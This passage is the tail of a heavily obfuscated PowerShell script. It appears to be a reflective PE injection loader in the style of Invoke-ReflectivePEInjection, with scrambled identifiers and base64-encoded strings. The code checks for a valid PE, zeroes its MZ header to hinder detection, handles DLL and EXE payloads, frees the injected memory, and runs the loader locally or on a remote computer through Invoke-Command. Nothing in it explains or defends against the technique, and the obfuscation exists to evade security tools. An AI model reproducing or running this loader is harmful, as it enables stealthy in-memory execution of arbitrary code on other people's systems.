		elseif ((${_/=====\_/=\/\___/}.FileType -ieq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABMAEwA')))) -and (${__/\_/\__/\/\__/\/} -ne [IntPtr]::Zero))
		{
			${_/==\/\/\/=\__/=\} = ___/\__/=\___/=\__ -__/=\____/\_/\/\_/ ${__/=\____/\_/\/\_/} -_/\_________/\_/\/ $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBvAGkAZABGAHUAbgBjAA==')))
			if ((${_/==\/\/\/=\__/=\} -eq $null) -or (${_/==\/\/\/=\__/=\} -eq [IntPtr]::Zero))
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBvAGkAZABGAHUAbgBjACAAYwBvAHUAbABkAG4AJwB0ACAAYgBlACAAZgBvAHUAbgBkACAAaQBuACAAdABoAGUAIABEAEwATAA=')))
			}
			${_/==\/\/\/=\__/=\} = _/\____/===\/\_/== ${_/==\/\/\/=\__/=\} ${__/=\____/\_/\/\_/}
			${_/==\/\/\/=\__/=\} = ____/\____/====\/= ${_/==\/\/\/=\__/=\} ${_/\_/=====\/\/\/\}
			${_/\/=\_/==\_/\___} = _/===\_/\_/\/==\_/ -___/=\/=\/====\___ ${__/\_/\__/\/\__/\/} -_/==\__/=\_/=\/\_/ ${_/==\/\/\/=\__/=\} -Win32Functions $Win32Functions
		}
		if (${__/\_/\__/\/\__/\/} -eq [IntPtr]::Zero -and ${_/=====\_/=\/\___/}.FileType -ieq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABMAEwA'))))
		{
			_____/==\/==\/\_/\ -__/=\____/\_/\/\_/ ${__/=\____/\_/\/\_/}
		}
		else
		{
			${_/\_/\__/\/=\/\/\} = $Win32Functions.VirtualFree.Invoke(${__/=\____/\_/\/\_/}, [UInt64]0, $Win32Constants.MEM_RELEASE)
			if (${_/\_/\__/\/=\/\/\} -eq $false)
			{
				Write-Warning $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABjAGEAbABsACAAVgBpAHIAdAB1AGEAbABGAHIAZQBlACAAbwBuACAAdABoAGUAIABQAEUAJwBzACAAbQBlAG0AbwByAHkALgAgAEMAbwBuAHQAaQBuAHUAaQBuAGcAIABhAG4AeQB3AGEAeQBzAC4A'))) -WarningAction Continue
			}
		}
		Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG4AZQAhAA==')))
	}
	___/======\/=\/===
}
Function ___/======\/=\/===
{
	if (($PSCmdlet.MyInvocation.BoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGIAdQBnAA==')))] -ne $null) -and $PSCmdlet.MyInvocation.BoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGIAdQBnAA==')))].IsPresent)
	{
		$DebugPreference  = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AdABpAG4AdQBlAA==')))
	}
	Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFMAaABlAGwAbAAgAFAAcgBvAGMAZQBzAHMASQBEADoAIAAkAFAASQBEAA==')))
	${__/=\__/\__/\/===} = ($PEBytes[0..1] | % {[Char] $_}) -join ''
    if (${__/=\__/\__/\/===} -ne 'MZ')
    {
        throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABFACAAaQBzACAAbgBvAHQAIABhACAAdgBhAGwAaQBkACAAUABFACAAZgBpAGwAZQAuAA==')))
    }
	if (-not $DoNotZeroMZ) {
		$PEBytes[0] = 0
		$PEBytes[1] = 0
	}
	if ($ExeArgs -ne $null -and $ExeArgs -ne '')
	{
		$ExeArgs = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGYAbABlAGMAdABpAHYAZQBFAHgAZQAgACQARQB4AGUAQQByAGcAcwA=')))
	}
	else
	{
		$ExeArgs = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGYAbABlAGMAdABpAHYAZQBFAHgAZQA=')))
	}
	if ($ComputerName -eq $null -or $ComputerName -imatch $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBcAHMAKgAkAA=='))))
	{
		icm -ScriptBlock ${_/\/===\/=\__/==\} -ArgumentList @($PEBytes, $FuncReturnType, $ProcId, $ProcName,$ForceASLR)
	}
	else
	{
		icm -ScriptBlock ${_/\/===\/=\__/==\} -ArgumentList @($PEBytes, $FuncReturnType, $ProcId, $ProcName,$ForceASLR) -ComputerName $ComputerName
	}
}
___/======\/=\/===
}